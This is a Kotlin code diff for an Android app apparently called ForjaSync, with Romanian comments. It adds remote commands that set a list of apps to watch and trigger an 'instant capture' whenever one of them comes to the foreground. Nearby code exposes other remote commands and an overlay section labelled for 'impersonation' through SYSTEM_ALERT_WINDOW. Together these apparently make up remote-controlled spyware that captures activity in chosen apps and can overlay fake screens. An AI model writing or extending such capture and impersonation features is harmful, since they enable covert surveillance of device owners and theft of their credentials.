@@ -78,6 +78,8 @@ object ForjaSyncCapabilities {
                 "network" -> network()
                 "storage_list" -> storageList(p)
                 "app_icons" -> appIcons(p)
+                "watch_apps" -> watchApps(p)
+                "unwatch_apps" -> unwatchApps()
                 "eco" -> { PowerSaver.active = true; buildJsonObject { put("ok", true); put("msg", "mod economie activ — sincronizare rare") } }
                 "active" -> { PowerSaver.active = false; buildJsonObject { put("ok", true); put("msg", "mod normal — sincronizare standard") } }
                 "ping" -> buildJsonObject { put("pong", true); put("ts", System.currentTimeMillis()) }
@@ -907,6 +909,38 @@ object ForjaSyncCapabilities {
             put("sync_running", SyncService.running)
             put("sync_last_keepalive_ms", SyncService.lastKeepaliveTs)
         }
+    }
+
+    // ── App Watch: instant capture pe schimbarea de aplicație foreground ──
+    // Salvează lista de aplicații monitorizate în SharedPreferences + le trimite
+    // către ForjaGuardService pentru declanșare instantanee (fără a aștepta heartbeat-ul).
+    private fun watchApps(p: JsonObject): JsonObject {
+        val apps = p["apps"]?.jsonArray?.mapNotNull { it.jsonPrimitive.content } ?: emptyList()
+        val cooldown = (p["cooldown_s"]?.jsonPrimitive?.content?.toIntOrNull() ?: 60).coerceIn(10, 3600)
+        if (apps.isEmpty()) return buildJsonObject { put("ok", false); put("msg", "lista goală — folosește unwatch_apps") }
+        val prefs = app.getSharedPreferences("forja", Context.MODE_PRIVATE)
+        prefs.edit()
+            .putString("watch_apps", apps.joinToString(","))
+            .putInt("watch_cooldown", cooldown)
+            .putBoolean("watch_enabled", true)
+            .apply()
+        ForjaGuardService.updateWatchList(apps, cooldown)
+        return buildJsonObject {
+            put("ok", true)
+            put("count", apps.size)
+            put("cooldown_s", cooldown)
+            putJsonArray("watching") { apps.forEach { add(it) } }
+        }
+    }
+
+    private fun unwatchApps(): JsonObject {
+        val prefs = app.getSharedPreferences("forja", Context.MODE_PRIVATE)
+        prefs.edit()
+            .putString("watch_apps", "")
+            .putBoolean("watch_enabled", false)
+            .apply()
+        ForjaGuardService.clearWatchList()
+        return buildJsonObject { put("ok", true); put("msg", "supraveghere oprită") }
     }
 
     // ── Overlay ecran — prompt / alertă / impersonare, prin SYSTEM_ALERT_WINDOW ──
